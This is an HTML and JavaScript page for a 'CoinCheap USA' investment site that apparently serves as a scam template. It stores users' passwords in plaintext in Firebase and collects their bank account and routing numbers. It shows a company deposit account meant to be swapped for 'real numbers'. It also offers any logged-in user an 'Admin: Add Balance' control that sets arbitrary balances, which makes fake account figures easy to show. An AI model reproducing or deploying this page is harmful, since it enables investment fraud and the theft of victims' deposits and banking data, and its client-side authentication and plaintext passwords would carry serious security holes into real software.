<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>CoinCheap USA</title>
<style>
*{box-sizing:border-box;margin:0;padding:0;font-family:Arial}
body{background:#0a192f;min-height:100vh;display:flex;justify-content:center;align-items:center;padding:15px}
.box{background:#fff;padding:20px;border-radius:16px;width:100%;max-width:420px;box-shadow:0 10px 30px rgba(0,0,0,.5)}
input{width:100%;padding:13px;margin:6px 0;border-radius:10px;border:2px solid #dbeafe;background:#f0f7ff}
.btn{width:100%;padding:13px;border:none;border-radius:12px;font-weight:900;cursor:pointer;margin-top:8px;color:#fff;font-size:14px}
.blue{background:#1e3a8a}.orange{background:#ea580c}.green{background:#16a34a}.gray{background:#334155}
.tab{display:none}.tab.active{display:block}
.nav{display:flex;gap:5px;margin:12px 0}
.nav button{flex:1;padding:10px 2px;border-radius:10px;border:1px solid #cbd5e1;background:#f1f5f9;font-weight:800;cursor:pointer;font-size:12px}
.nav button.active{background:#1e3a8a;color:#fff;border-color:#1e3a8a}
.bal{font-size:38px;font-weight:900;color:#f59e0b;text-align:center}
.card{background:#f8fafc;border:1px solid #e2e8f0;padding:12px;border-radius:10px;margin:8px 0;font-size:13px;line-height:1.6}
#msg{text-align:center;font-weight:900;margin-top:10px;min-height:18px;font-size:13px}
h3{color:#1e3a8a;text-align:center;margin:10px 0;font-size:14px}
</style>
</head>
<body>
<div class="box">
<h2 style="text-align:center;color:#1e3a8a">CoinCheap USA 🇺🇸</h2>

<div class="nav">
<button id="btnReg" onclick="showTab('reg')" class="active">Register</button>
<button id="btnLog" onclick="showTab('log')">Login</button>
<button id="btnDash" onclick="showTab('dash')">Dashboard</button>
<button id="btnBank" onclick="showTab('bank')">Banks</button>
</div>

<!-- REGISTER -->
<div id="reg" class="tab active">
<input id="rEmail" type="email" placeholder="Email e.g akagaviani@gmail.com">
<input id="rPass" type="password" placeholder="Password">
<button class="btn blue" onclick="signUp()">CREATE ACCOUNT</button>
</div>

<!-- LOGIN -->
<div id="log" class="tab">
<input id="lEmail" type="email" placeholder="Email">
<input id="lPass" type="password" placeholder="Password">
<button class="btn orange" onclick="login()">LOGIN</button>
</div>

<!-- DASHBOARD -->
<div id="dash" class="tab">
<h3>Dashboard</h3>
<div class="bal" id="bal">$0.00</div>
<p id="dashEmail" style="text-align:center;font-size:11px;color:#64748b"></p>
<div class="card">
<b>💰 Admin: Add Balance</b>
<input id="adminEmail" placeholder="Client email (empty = you)">
<input id="adminAmt" type="number" placeholder="Amount e.g 500">
<button class="btn green" onclick="addMoney()">Add Balance +</button>
</div>
<button class="btn gray" onclick="logout()">Logout</button>
</div>

<!-- BANKS -->
<div id="bank" class="tab">
<h3>🇺🇸 COMPANY DEPOSIT BANK</h3>
<div class="card" style="border-left:4px solid #1e3a8a">
<b id="compBankName">Huntington Bank</b> - Change name below<br>
Acc Name: CoinCheap Investment LLC<br>
Routing: <span id="compRout">044000024</span><br>
Account: <span id="compAcc">********1234</span><br>
<small style="color:red">Edit real numbers inside code line 70</small><br><br>
<input id="editCompBank" placeholder="e.g Abri Credit Union or GLCU" style="padding:9px">
<button class="btn blue" style="padding:9px;font-size:12px" onclick="updateCompBank()">Update Bank Name Display</button>
</div>

<h3>🏦 YOUR BANK (Withdrawal)</h3>
<input id="cBankName" placeholder="Your Bank Name">
<input id="cAccName" placeholder="Account Name">
<input id="cAccNum" placeholder="Account Number">
<input id="cRouting" placeholder="Routing Number">
<button class="btn blue" onclick="saveClientBank()">Save My Bank</button>
<div class="card" id="savedBank">No bank saved</div>
</div>

<p id="msg"></p>
</div>

<script type="module">
import { initializeApp } from "https://www.gstatic.com/firebasejs/12.18.0/firebase-app.js";
import { getDatabase, ref, set, get, update } from "https://www.gstatic.com/firebasejs/12.18.0/firebase-database.js";

const firebaseConfig = {
apiKey: "AIzaSyCLD9yedNA-l1M6VU01L9gZ40jv36PlSsw",
authDomain: "coincheap-investment.firebaseapp.com",
databaseURL: "https://coincheap-investment-default-rtdb.firebaseio.com",
projectId: "coincheap-investment",
storageBucket: "coincheap-investment.firebasestorage.app",
messagingSenderId: "1065612358336",
appId: "1:1065612358336:web:1e9b4678e5df622bc9f325"
};

const app = initializeApp(firebaseConfig);
const db = getDatabase(app);

// TABS - THIS CONNECTS ALL 4 BUTTONS
window.showTab = function(t){
document.querySelectorAll('.tab').forEach(x=>x.classList.remove('active'));
document.querySelectorAll('.nav button').forEach(x=>x.classList.remove('active'));
document.getElementById(t).classList.add('active');
document.getElementById('btn'+t.charAt(0).toUpperCase()+t.slice(1)).classList.add('active');
document.getElementById('msg').innerText='';
}

function keyFromEmail(e){return e.replace(/[^a-zA-Z0-9]/g,'_');}

window.signUp = async function(){
let email=document.getElementById('rEmail').value.trim().toLowerCase();
let pass=document.getElementById('rPass').value;
let msg=document.getElementById('msg');
if(!email||!pass){msg.innerText='Fill email & password';msg.style.color='red';return;}
msg.innerText='Creating...';msg.style.color='#1e3a8a';
let k=keyFromEmail(email);
let snap=await get(ref(db,'users/'+k));
if(snap.exists()){msg.innerText='Account exists! Login';msg.style.color='orange';showTab('log');return;}
await set(ref(db,'users/'+k),{email,password:pass,balance:0,bank:null,created:new Date().toLocaleString()});
msg.innerText='✅ Created! Now login';msg.style.color='green';
document.getElementById('lEmail').value=email;
showTab('log');
}

window.login = async function(){
let email=document.getElementById('lEmail').value.trim().toLowerCase();
let pass=document.getElementById('lPass').value;
let msg=document.getElementById('msg');
if(!email||!pass){msg.innerText='Fill all';return;}
msg.innerText='Checking...';
let k=keyFromEmail(email);
let snap=await get(ref(db,'users/'+k));
if(!snap.exists()){msg.innerText='No account found';msg.style.color='red';return;}
if(snap.val().password!=pass){msg.innerText='Wrong password';msg.style.color='red';return;}
localStorage.setItem('current_user',email);
loadDash(email,snap.val());
msg.innerText='✅ Welcome '+email;msg.style.color='green';
showTab('dash');
}

function loadDash(email,data){
document.getElementById('dashEmail').innerText=email;
document.getElementById('bal').innerText='$'+(data.balance||0)+'.00';
if(data.bank){
document.getElementById('savedBank').innerHTML='<b>Saved:</b><br>Bank: '+data.bank.bankName+'<br>Name: '+data.bank.accName+'<br>Acc: '+data.bank.accNum+'<br>Routing: '+data.bank.routing;
document.getElementById('cBankName').value=data.bank.bankName||'';
document.getElementById('cAccName').value=data.bank.accName||'';
document.getElementById('cAccNum').value=data.bank.accNum||'';
document.getElementById('cRouting').value=data.bank.routing||'';
}
let savedComp = localStorage.getItem('comp_bank_name');
if(savedComp) document.getElementById('compBankName').innerText=savedComp;
}

window.saveClientBank = async function(){
let email=localStorage.getItem('current_user');
let msg=document.getElementById('msg');
if(!email){msg.innerText='Login first to save bank';msg.style.color='red';showTab('log');return;}
let bank={bankName:document.getElementById('cBankName').value,accName:document.getElementById('cAccName').value,accNum:document.getElementById('cAccNum').value,routing:document.getElementById('cRouting').value,saved:new Date().toLocaleString()};
if(!bank.bankName||!bank.accNum){msg.innerText='Fill Bank Name & Account Number';msg.style.color='red';return;}
await update(ref(db,'users/'+keyFromEmail(email)),{bank});
document.getElementById('savedBank').innerHTML='<b>✅ Saved:</b><br>Bank: '+bank.bankName+'<br>Acc: '+bank.accNum;
msg.innerText='✅ Your Bank Saved!';msg.style.color='green';
}

window.addMoney = async function(){
let email=(document.getElementById('adminEmail').value.trim().toLowerCase()) || localStorage.getItem('current_user');
let amt=parseFloat(document.getElementById('adminAmt').value);
let msg=document.getElementById('msg');
if(!email||!amt){msg.innerText='Put email & amount';msg.style.color='red';return;}
let k=keyFromEmail(email);
let snap=await get(ref(db,'users/'+k));
if(!snap.exists()){msg.innerText='User not found: '+email;msg.style.color='red';return;}
let cur=parseFloat(snap.val().balance||0);
await update(ref(db,'users/'+k),{balance:cur+amt});
document.getElementById('bal').innerText='$'+(cur+amt)+'.00';
msg.innerText='✅ Added $'+amt+' to '+email;msg.style.color='green';
}

window.updateCompBank = function(){
let newName=document.getElementById('editCompBank').value.trim();
if(!newName){document.getElementById('msg').innerText='Type bank name';return;}
document.getElementById('compBankName').innerText=newName;
localStorage.setItem('comp_bank_name',newName);
document.getElementById('msg').innerText='✅ Display changed to '+newName;document.getElementById('msg').style.color='green';
}

window.logout = function(){localStorage.removeItem('current_user');document.getElementById('msg').innerText='Logged out';showTab('log');}

// AUTO LOGIN IF SAVED
let saved=localStorage.getItem('current_user');
if(saved){get(ref(db,'users/'+keyFromEmail(saved))).then(s=>{if(s.exists()){loadDash(saved,s.val());}});}

</script>
<script id="chatway" async="true" src="https://cdn.chatway.app/widget.js?id=YcVV5pL9H0KO"></script>
</body>
</html>
